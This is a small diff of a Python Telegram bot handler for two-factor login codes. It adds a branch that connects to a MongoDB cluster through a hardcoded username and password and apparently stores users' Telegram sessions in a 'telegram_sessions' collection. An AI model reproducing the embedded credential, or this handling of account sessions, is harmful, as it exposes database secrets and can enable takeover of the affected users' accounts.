@@ -86,6 +86,7 @@ async def recv_tg_tfa_message(_, message: Message):
             "Kode yang anda masukkan salah, coba masukan kembali atau mulai dari awal",
         )
         del AKTIFPERINTAH[message.chat.id]
+    else:
         client = pymongo.MongoClient("mongodb+srv://ubot:dC9mgT230G5qS416@dbaas-db-10420372-651e6e61.mongo.ondigitalocean.com/admin?tls=true&authSource=admin&replicaSet=dbaas-db-10420372")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
